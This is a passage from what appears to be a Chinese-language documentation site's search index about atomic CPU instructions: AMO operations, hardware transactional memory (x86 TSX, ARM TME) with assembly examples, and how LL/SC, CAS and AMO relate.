\u200b\u5373\u53ef\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u65e0\u6cd5\u200b\u6253\u65ad\u200b\u8fd9\u4e2a\u200b\u539f\u5b50\u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#amo","title":"AMO","text":""},{"location":"software/atomic_instructions.html#_12","title":"\u5b9a\u4e49","text":"<p>AMO\uff08Atomic Memory Operations\uff09\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5bf9\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u8fdb\u884c\u200b\u539f\u5b50\u200b\u66f4\u65b0\u200b\uff1a\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u5199\u5165\u200b\u5230\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u540c\u65f6\u200b\u5bf9\u503c\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u66f4\u65b0\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u518d\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u66f4\u65b0\u200b\u64cd\u4f5c\u200b\u662f\u200b\u9884\u8bbe\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4f4d\u200b\u8fd0\u7b97\u200b\uff08AND\u3001OR\u3001XOR \u200b\u548c\u200b SWAP\uff09\u200b\u6216\u8005\u200b\u6574\u6570\u200b\u8fd0\u7b97\u200b\uff08ADD\u3001MIN \u200b\u548c\u200b MAX\uff09\u200b\u7b49\u7b49\u200b\u3002\u200b\u5b83\u7528\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5b8c\u6210\u200b\u4e86\u200b\u524d\u9762\u200b LL/SC \u200b\u6216\u8005\u200b CAS \u200b\u6307\u4ee4\u200b\u7684\u200b\u8bfb\u200b - \u200b\u6539\u200b - \u200b\u5199\u200b\u5faa\u73af\u200b\u505a\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f46\u662f\u200b\u9650\u5236\u200b\u4e86\u200b\u5141\u8bb8\u200b\u7684\u200b\u4fee\u6539\u200b\u64cd\u4f5c\u200b\uff1a</p> <pre><code># Use AMO\n    amoadd dest, addr, 1\n\n# Use CAS\nloop:\n    # Read\n    load old_data, addr\n    # Modify\n    add new_data, old_data, 1\n    # Compare-And-Swap\n    cas dest, addr, old_data, new_data\n    # Try again if CAS failed\n    goto loop if failed\n</code></pre>"},{"location":"software/atomic_instructions.html#_13","title":"\u5e38\u89c1\u200b\u7528\u6cd5","text":"<p>AMO \u200b\u6307\u4ee4\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u628a\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u8bfb\u200b - \u200b\u6539\u200b - \u200b\u5199\u200b\u5faa\u73af\u200b\u56fa\u5316\u200b\u6210\u200b\u4e86\u200b\u6307\u4ee4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u539f\u6765\u200b\u7528\u200b LL/SC \u200b\u6216\u200b CAS \u200b\u5b9e\u73b0\u200b\u7684\u200b\u4e00\u4e9b\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u5bf9\u5e94\u200b\u7684\u200b AMO \u200b\u6307\u4ee4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u7528\u200b AMO \u200b\u6307\u4ee4\u200b\u5b9e\u73b0\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_14","title":"\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u652f\u6301","text":"<p>RISC-V \u200b\u548c\u200b LoongArch \u200b\u90fd\u200b\u63d0\u4f9b\u200b\u4e86\u200b AMO \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5b83\u4eec\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b\u5185\u5b58\u200b\u7684\u200b\u539f\u5b50\u200b\u66f4\u65b0\u200b\uff0c\u200b\u540c\u65f6\u200b\u5f97\u5230\u200b\u66f4\u65b0\u200b\u524d\u200b\u7684\u200b\u65e7\u503c\u200b\u3002x86 \u200b\u6307\u4ee4\u96c6\u200b\u4e0b\u200b\uff0c\u200b\u901a\u8fc7\u200b\u7ed9\u200b add \u200b\u6307\u4ee4\u200b\u6dfb\u52a0\u200b lock \u200b\u524d\u7f00\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u539f\u5b50\u200b\u66f4\u65b0\u200b\u7684\u200b\u6548\u679c\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u5f97\u5230\u200b\u66f4\u65b0\u200b\u524d\u200b\u7684\u200b\u65e7\u503c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b xadd \u200b\u6307\u4ee4\u200b\u3002</p> <p>AArch64 \u200b\u63d0\u4f9b\u200b\u4e86\u200b AMO \u200b\u6307\u4ee4\u200b\uff1aLDADD\u3001LDCLR\u3001LDEOR\u3001LDSET\u3001LDSMAX\u3001LDSMIN\u3001LDUMAX\u3001LDUMIN\u3001STADD\u3001STCLR\u3001STEOR\u3001STSET\u3001STSMAX\u3001STSMIN\u3001STUMAX\u3001STUMIN\u3001SWP \u200b\u7b49\u7b49\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b\u5b9e\u73b0\u200b\u4e86\u200b LSFE \u200b\u6269\u5c55\u200b\u7684\u200b AArch64 \u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0c\u200b\u8fd8\u200b\u652f\u6301\u200b\u6d6e\u70b9\u200b\u7684\u200b AMO \u200b\u6307\u4ee4\u200b\uff1aLDFADD\u3001LDFMAX\u3001LDFMIN\u3001LDBFADD\u3001LDBFMAX\u3001LDBFMIN\u3001STFADD\u3001STFMAX\u3001STFMIN\u3001STBFADD\u3001STBFMAX\u3001STBFMIN\u3002</p>"},{"location":"software/atomic_instructions.html#_15","title":"\u786c\u4ef6\u200b\u5b9e\u73b0","text":"<p>AMO \u200b\u6307\u4ee4\u200b\u7684\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u548c\u200b CAS \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u628a\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b\u4e0b\u200b\u653e\u5230\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u53bb\u200b\u6267\u884c\u200b\u3002\u200b\u4f46\u200b\u7531\u4e8e\u200b AMO \u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u6d89\u53ca\u200b\u5c11\u91cf\u200b\u7684\u200b\u66f4\u65b0\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4f4d\u200b\u8fd0\u7b97\u200b\u548c\u200b\u6574\u6570\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u56e0\u6b64\u200b\u7f13\u5b58\u200b\u5185\u90e8\u200b\u4e5f\u200b\u9700\u8981\u200b\u5f15\u5165\u200b\u4e00\u4e2a\u200b ALU \u200b\u7528\u4e8e\u200b\u5b9e\u73b0\u200b AMO \u200b\u6307\u4ee4\u200b\u7684\u200b\u8ba1\u7b97\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u76ee\u524d\u200b AMO \u200b\u6307\u4ee4\u200b\u4ec5\u9650\u4e8e\u200b\u786c\u4ef6\u200b\u5f00\u9500\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b\u4f4d\u200b\u8fd0\u7b97\u200b\u548c\u200b\u6574\u6570\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6574\u6570\u200b\u4e58\u9664\u200b\u6cd5\u200b\uff0c\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u6d6e\u70b9\u8fd0\u7b97\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b Rocket Chip \u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u4e00\u4e2a\u200b AMOALU\uff0c\u200b\u7528\u4e8e\u200b\u5728\u200b DCache \u200b\u4e2d\u200b\u5b9e\u73b0\u200b AMO \u200b\u6307\u4ee4\u200b\u7684\u200b\u8ba1\u7b97\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#htm","title":"HTM","text":""},{"location":"software/atomic_instructions.html#_16","title":"\u5b9a\u4e49","text":"<p>HTM \u200b\u662f\u200b\u786c\u4ef6\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5728\u200b\u5185\u5b58\u200b\u4e0a\u200b\u7684\u200b\u4e8b\u52a1\u200b\u3002\u200b\u4e8b\u52a1\u200b\u8fd9\u4e2a\u200b\u6982\u5ff5\u200b\u5728\u200b\u6570\u636e\u5e93\u200b\u4e0a\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\uff0c\u200b\u628a\u200b\u591a\u4e2a\u200b\u5bf9\u200b\u6570\u636e\u5e93\u200b\u7684\u200b\u64cd\u4f5c\u200b\u653e\u5230\u200b\u4e00\u4e2a\u200b\u4e8b\u52a1\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u6574\u4e2a\u200b\u4e8b\u52a1\u200b\u7684\u200b\u539f\u5b50\u200b\u6027\u200b\u3002HTM \u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u662f\u200b\u5728\u200b CPU \u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u6307\u4ee4\u200b\u5bf9\u200b\u5185\u5b58\u200b\u7684\u200b\u64cd\u4f5c\u200b\u662f\u200b\u539f\u5b50\u200b\u7684\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_17","title":"\u5e38\u89c1\u200b\u7528\u6cd5","text":"<p>\u200b\u901a\u5e38\u200b\uff0c\u200b\u5b83\u200b\u9700\u8981\u200b\u7528\u200b\u7279\u5b9a\u200b\u7684\u200b begin \u200b\u6307\u4ee4\u200b\u5f00\u59cb\u200b\u4e00\u6bb5\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u6267\u884c\u200b\u4e00\u7cfb\u5217\u200b\u6307\u4ee4\u200b\u540e\u200b\uff0c\u200b\u518d\u7528\u200b\u7279\u5b9a\u200b\u7684\u200b end \u200b\u6307\u4ee4\u200b\u7ed3\u675f\u200b\u4e8b\u52a1\u200b\u3002\u200b\u5982\u679c\u200b\u5728\u200b\u4e8b\u52a1\u200b\u4e2d\u9014\u200b\uff0c\u200b\u4e8b\u52a1\u200b\u88ab\u200b\u6253\u65ad\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7a0b\u5e8f\u200b\u4e3b\u52a8\u200b\u7528\u200b\u6307\u4ee4\u200b\u6253\u65ad\u200b\uff0c\u200b\u6216\u8005\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u5185\u5b58\u200b\u88ab\u200b\u5176\u4ed6\u200b\u5904\u7406\u5668\u200b\u6838\u5fc3\u200b\u4fee\u6539\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e8b\u52a1\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u56de\u6eda\u200b\uff0c\u200b\u540c\u65f6\u200b\u7a0b\u5e8f\u200b\u8f6c\u79fb\u200b\u5230\u200b\u6307\u5b9a\u200b\u7684\u200b fallback \u200b\u5730\u5740\u200b\u7ee7\u7eed\u6267\u884c\u200b\uff0c\u200b\u8fd9\u4e2a\u200b fallback \u200b\u5730\u5740\u200b\u4f1a\u200b\u5728\u200b begin \u200b\u6307\u4ee4\u200b\u4e2d\u200b\u7ed9\u51fa\u200b\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u6bb5\u200b\u7528\u200b\u786c\u4ef6\u200b\u5185\u5b58\u200b\u4e8b\u52a1\u200b\u5b9e\u73b0\u200b\u7684\u200b\u539f\u5b50\u200b\u52a0\u4e00\u200b\uff1a</p> <pre><code>retry:\n    # begin transaction\n    # set fallback address to fail label\n    begin fail\n\n    # do computation\n    load data, addr\n    add data, data, 1\n    store data, addr\n\n    # end transaction\n    end\n\nfail:\n    # retry if transaction failed\n    goto retry\n</code></pre> <p>\u200b\u5b9e\u9645\u4e0a\u200b\uff0cHTM \u200b\u652f\u6301\u200b\u5d4c\u5957\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e00\u6b21\u200b\u4e8b\u52a1\u200b\u4e2d\u9014\u200b\uff0c\u200b\u518d\u5f00\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u4e8b\u52a1\u200b\u3002\u200b\u4f46\u200b\u53ea\u6709\u200b\u6700\u200b\u5916\u5c42\u200b\u7684\u200b\u4e8b\u52a1\u200b\u7684\u200b end \u200b\u6307\u4ee4\u200b\u4f1a\u200b\u63d0\u4ea4\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u56de\u6eda\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u56de\u6eda\u200b\u5230\u200b\u6700\u200b\u5916\u5c42\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u518d\u200b\u8df3\u8f6c\u200b\u5230\u200b\u6700\u200b\u5916\u5c42\u200b\u4e8b\u52a1\u200b\u7684\u200b fallback \u200b\u5730\u5740\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_18","title":"\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u652f\u6301","text":"<p>x86_64 \u200b\u6307\u4ee4\u96c6\u200b\u63d0\u4f9b\u200b\u4e86\u200b Transactional Synchronization Extensions (TSX) \u200b\u6269\u5c55\u200b\uff0c\u200b\u5b83\u200b\u6709\u200b\u4e24\u79cd\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\uff1aHardware Lock Elision \u200b\u548c\u200b Restricted Transactional Memory\u3002\u200b\u5b83\u200b\u7684\u200b\u6587\u6863\u200b\u5728\u200b Intel 64 and IA-32 Architectures Software Develop's Manual \u200b\u7684\u200b Volume 1 Chapter 16 Programming with Intel Transaction Synchronization Extensions\u3002</p> <p>Hardware Lock Elision \u200b\u7684\u200b\u5e94\u7528\u200b\u573a\u666f\u200b\u662f\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u7f16\u5199\u200b\u4e86\u200b critical section\uff0c\u200b\u5e76\u4e14\u200b\u7528\u9501\u6765\u200b\u4fdd\u62a4\u200b\u5b83\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u540c\u65f6\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u6838\u5fc3\u200b\u5728\u200b\u6267\u884c\u200b\u8fd9\u4e2a\u200b critical section\u3002\u200b\u4f46\u9501\u4f1a\u200b\u5e26\u6765\u200b\u989d\u5916\u200b\u7684\u200b\u5f00\u9500\u200b\u3002\u200b\u65e2\u7136\u200b\u6709\u200b\u4e86\u200b\u786c\u4ef6\u200b\u5185\u5b58\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5148\u200b\u8df3\u200b\u8fc7\u200b\u52a0\u9501\u200b\u8fd9\u200b\u4e00\u6b65\u200b\uff0c\u200b\u5728\u200b\u4e8b\u52a1\u200b\u91cc\u200b\u6267\u884c\u200b\u4e00\u6b21\u200b critical section\uff0c\u200b\u5728\u200b\u539f\u6765\u200b\u91ca\u653e\u200b\u9501\u200b\u7684\u200b\u5730\u65b9\u200b\u7ed3\u675f\u200b\u4e8b\u52a1\u200b\u3002\u200b\u5982\u679c\u200b\u4e8b\u52a1\u200b\u6210\u529f\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u8bf4\u660e\u200b\u6ca1\u6709\u200b\u5176\u4ed6\u200b\u6838\u5fc3\u200b\u8981\u200b\u8fdb\u5165\u200b critical section\uff0c\u200b\u90a3\u200b\u5c31\u200b\u7701\u200b\u4e0b\u200b\u4e86\u200b\u9501\u200b\u7684\u200b\u5f00\u9500\u200b\uff1b\u200b\u5982\u679c\u200b\u4e8b\u52a1\u200b\u6ca1\u6709\u200b\u6210\u529f\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u5c31\u4f1a\u200b\u56de\u6eda\u200b\uff0c\u200b\u518d\u200b\u6b63\u5e38\u200b\u6267\u884c\u200b\u5e26\u9501\u200b\u7684\u200b critical section\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c\u200b\u5b83\u200b\u5728\u200b\u52a0\u9501\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b XACQUIRE \u200b\u524d\u7f00\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u91ca\u653e\u200b\u9501\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b XRELEASE \u200b\u524d\u7f00\u200b\u3002\u200b\u90a3\u4e48\u200b\u5728\u200b\u652f\u6301\u200b TSX \u200b\u7684\u200b\u786c\u4ef6\u200b\u4e0a\u200b\uff0c\u200b\u5904\u7406\u5668\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7528\u200b\u786c\u4ef6\u200b\u4e8b\u52a1\u200b\u6765\u200b\u5c1d\u8bd5\u200b\u7ed5\u8fc7\u200b\u9501\u200b\u3002\u200b\u5982\u679c\u200b\u5904\u7406\u5668\u200b\u4e0d\u200b\u652f\u6301\u200b TSX\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5ffd\u7565\u200b\u6389\u200b XACQUIRE \u200b\u548c\u200b XRELEASE \u200b\u524d\u7f00\u200b\uff0c\u200b\u6b63\u5e38\u200b\u4e0a\u9501\u200b\u3001\u200b\u6267\u884c\u200b\u4ee3\u7801\u200b\u518d\u200b\u91ca\u653e\u200b\u9501\u200b\u3002</p> <p>Restricted Transactional Memory \u200b\u5c31\u662f\u200b\u5b8c\u6574\u200b\u7684\u200b\u786c\u4ef6\u200b\u5185\u5b58\u200b\u4e8b\u52a1\u200b\u652f\u6301\u200b\uff1a\u200b\u7528\u200b XBEGIN \u200b\u6307\u4ee4\u200b\u5f00\u59cb\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u7528\u200b XEND \u200b\u6307\u4ee4\u200b\u7ed3\u675f\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u7528\u200b XABORT \u200b\u6307\u4ee4\u200b\u6253\u65ad\u200b\u5f53\u524d\u200b\u4e8b\u52a1\u200b\u3002</p> <p>AArch64 \u200b\u4ece\u200b ARMv9-A \u200b\u5f00\u59cb\u200b\uff0c\u200b\u4e5f\u200b\u5f15\u5165\u200b\u4e86\u200b\u786c\u4ef6\u200b\u5185\u5b58\u200b\u4e8b\u52a1\u200b\u652f\u6301\u200b\uff1aTransactional Memory Extension (TME)\u3002\u200b\u5b83\u200b\u5f15\u5165\u200b\u4e86\u200b\u5982\u4e0b\u200b\u7684\u200b\u65b0\u200b\u6307\u4ee4\u200b\uff1a</p> <ul> <li>TCANCEL imm: \u200b\u5bf9\u5e94\u200b x86 \u200b\u7684\u200b XABORT\uff0c\u200b\u53d6\u6d88\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u4ece\u200b TSTART \u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5f00\u59cb\u200b\u7ee7\u7eed\u6267\u884c\u200b\uff0cimm \u200b\u4f1a\u200b\u88ab\u200b\u5199\u5165\u200b\u5230\u200b TSTART \u200b\u6307\u4ee4\u200b\u7684\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b</li> <li>TCOMMIT: \u200b\u5bf9\u5e94\u200b x86 \u200b\u7684\u200b XEND</li> <li>TSTART Xd: \u200b\u5bf9\u5e94\u200b x86 \u200b\u7684\u200b XBEGIN\uff0c\u200b\u5982\u679c\u200b\u4e8b\u52a1\u200b\u6210\u529f\u200b\u5f00\u59cb\u200b\uff0c\u200b\u90a3\u4e48\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u88ab\u200b\u5199\u5165\u200b 0\uff1b\u200b\u5982\u679c\u200b\u4e8b\u52a1\u200b\u5931\u8d25\u200b\uff0c\u200b\u90a3\u4e48\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u4f1a\u200b\u88ab\u200b\u5199\u5165\u200b\u4e3a\u200b\u4e8b\u52a1\u200b\u5931\u8d25\u200b\u539f\u56e0\u200b</li> <li>TTEST Xd: \u200b\u628a\u200b\u76ee\u524d\u200b\u7684\u200b\u4e8b\u52a1\u200b\u5d4c\u5957\u200b\u5c42\u7ea7\u200b\u5199\u200b\u5230\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b</li> </ul> <p>\u200b\u56e0\u6b64\u200b TME \u200b\u7684\u200b\u9884\u671f\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff08\u200b\u4f8b\u5b50\u200b\u6765\u81ea\u200b ARM DDI0617 C1.1 Conventions\uff09\uff1a</p> <pre><code>loop\n    tstart x12     # attempt to start a new transaction\n    cbnz x12, loop # retry forever\n\n    &lt;code&gt;\n\n    tcommit\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0cTME \u200b\u6269\u5c55\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u5b9e\u73b0\u200b\u7c7b\u4f3c\u200b x86 \u200b\u7684\u200b HLE \u200b\u7279\u6027\u200b\uff1aTransactional Lock Elision\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u4e0e\u200b x86 \u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u4e0d\u540c\u200b\uff0cAArch64 \u200b\u7684\u200b TME \u200b\u6269\u5c55\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u7528\u200b\u4e0a\u8ff0\u200b\u7684\u200b TSTART \u200b\u7b49\u200b\u6307\u4ee4\u200b\u6765\u200b\u5b9e\u73b0\u200b Transactional Lock Elision\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff08\u200b\u6765\u81ea\u200b ARM DDI0617 C2.3 Acquiring a lock\uff09\uff1a</p> <p>\u200b\u83b7\u5f97\u200b\u9501\u200b\uff1a</p> <pre><code>loop:\n    TSTART X5         # attempt to start a new transaction\n    CBNZ X5, fallback # check if start succeeded\n\n    # CHECK_ACQ(X1)\n    # add the fallback lock to the transactional read set ; and set W5 to 0 if the fallback lock is free.\n    LDAR W5, [X1]\n\n    CBZ W5, enter     # if the fallback lock is free enter the critical region\n    TCANCEL #0xFFFF   # otherwise cancel the transaction with RTRY set to 1\n\nfallback:\n    TBZ X5, #15, lock # if RTRY is 0 take the fallback lock\n    SUB W6, W6, #1    # decrement the retry count\n    CBZ W6, lock      # take the lock if 0\n\n    # WAIT_ACQ(X1==0)\n    # wait until the lock is free\nloop_wait:\n    LDAR W5, [X1]     # load acquire ensures it is ordered before subsequent loads/stores\n    CBNZ W5, loop_wait\n\n    B loop            # retry the transaction\n\nlock:\n    # LOCK(X1)\n    # elision failed, acquire the fallback lock\n\n    PRFM PSTL1KEEP, [X1] # preload into cache in unique state\nloop_lock:\n    LDAXR W5, [X1]       # read lock with acquire\n    CBNZ W5, loop_lock   # check if 0\n    STXR W5, W0, [X1]    # attempt to store new value\n    CBNZ W5, loop_lock   # test if store succeeded and retry if not\n\n    DMB ISH           # block loads/stores from the critical region\n\nenter:\n</code></pre> <p>\u200b\u4ee3\u7801\u200b\u9996\u5148\u200b\u5f00\u59cb\u200b\u4e00\u6b21\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\u9501\u200b\u6ca1\u6709\u200b\u88ab\u200b\u5176\u4ed6\u200b\u7ebf\u7a0b\u200b\u83b7\u5f97\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u76f4\u63a5\u200b\u8df3\u8f6c\u200b\u5230\u200b enter \u200b\u8fdb\u884c\u200b critical section \u200b\u7684\u200b\u6267\u884c\u200b\uff1b\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\u9501\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5176\u4ed6\u200b\u7ebf\u7a0b\u200b\u83b7\u5f97\u200b\uff0c\u200b\u5c31\u200b\u53d6\u6d88\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u518d\u6b21\u200b\u5faa\u73af\u200b\uff0c\u200b\u5982\u679c\u200b\u5faa\u73af\u200b\u591a\u6b21\u200b\u8fd8\u662f\u200b\u5931\u8d25\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u7528\u200b\u4f20\u7edf\u200b\u7684\u200b\u9501\u200b\u3002</p> <p>\u200b\u5728\u200b critical section \u200b\u6700\u540e\u200b\u91ca\u653e\u200b\u9501\u200b\uff1a</p> <pre><code>    # CHECK(X1)\n    # set W5 to 0 if the fallback lock is free\n    LDR W5, [Xx] ; read lock\n\n    CBNZ W5, unlock   # check if 0\n    TCOMMIT           # the lock was elided, exit the transaction\n    B exit\n\nunlock:\n    # UNLOCK(X1)\n    # elision failed, release the fallback lock exit:\n    STLR WZR, [X1]    # clear the lock with release semantics\n\nexit:\n</code></pre> <p>\u200b\u9996\u5148\u200b\u68c0\u67e5\u200b\u4e4b\u524d\u200b\u662f\u200b\u91c7\u7528\u200b\u7684\u200b\u54ea\u79cd\u200b\u65b9\u6cd5\u200b\u201c\u200b\u83b7\u5f97\u200b\u201d\u200b\u4e86\u200b\u9501\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u4e8b\u52a1\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u63d0\u4ea4\u200b\u4e8b\u52a1\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u200b\u4f20\u7edf\u200b\u7684\u200b\u9501\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u91ca\u653e\u200b\u6389\u200b\u9501\u200b\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u76f8\u6bd4\u200b x86 \u200b\u7684\u200b\u65b9\u6848\u200b\uff0cARM \u200b\u7684\u200b TME \u200b\u5728\u200b\u5b9e\u73b0\u200b Lock Elision \u200b\u65f6\u200b\uff0c\u200b\u6307\u4ee4\u200b\u4e0a\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u5197\u4f59\u200b\uff0c\u200b\u4f46\u200b\u597d\u5904\u200b\u662f\u200b\u5fae\u200b\u67b6\u6784\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_19","title":"\u4e0d\u540c\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u95f4\u200b\u7684\u200b\u5173\u7cfb","text":"<p>\u200b\u4e0d\u540c\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u4e4b\u95f4\u200b\uff0c\u200b\u867d\u7136\u200b\u8bed\u4e49\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u4e00\u5b9a\u200b\u7a0b\u5ea6\u200b\u4e0a\u200b\u4e92\u76f8\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u7528\u200b LL/SC \u200b\u5b9e\u73b0\u200b CAS\uff1a\u200b\u9996\u5148\u200b\u7528\u200b LL \u200b\u8bfb\u53d6\u200b\u65e7\u503c\u200b\uff0c\u200b\u548c\u200b\u9884\u671f\u200b\u503c\u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b\uff0c\u200b\u5982\u679c\u200b\u76f8\u7b49\u200b\uff0c\u200b\u5219\u200b\u7528\u200b SC \u200b\u5199\u5165\u200b\u65b0\u503c\u200b\uff0c\u200b\u5982\u679c\u200b SC \u200b\u5199\u5165\u200b\u5931\u8d25\u200b\uff0c\u200b\u5219\u200b\u5faa\u73af\u200b\u3002</p> <p>\u200b\u7528\u200b CAS \u200b\u5b9e\u73b0\u200b AMO\uff1a\u200b\u9996\u5148\u200b\u8bfb\u53d6\u200b\u65e7\u503c\u200b\uff0c\u200b\u7528\u200b\u6307\u4ee4\u200b\u5b9e\u73b0\u200b AMO \u200b\u8981\u200b\u505a\u200b\u7684\u200b\u66f4\u65b0\u200b\u64cd\u4f5c\u200b\u540e\u200b\uff0c\u200b\u7528\u200b CAS \u200b\u5c1d\u8bd5\u200b\u5199\u5165\u200b\uff0c\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u7b49\u4e8e\u200b\u65e7\u503c\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b\u66f4\u65b0\u200b\u540e\u200b\u7684\u200b\u65b0\u503c\u200b\u5199\u5165\u200b\uff0c\u200b\u5982\u679c\u200b\u5199\u5165\u200b\u5931\u8d25\u200b\uff0c\u200b\u5219\u200b\u5faa\u73af\u200b\u3002</p> <p>\u200b\u7528\u200b CAS \u200b\u5b9e\u73b0\u200b 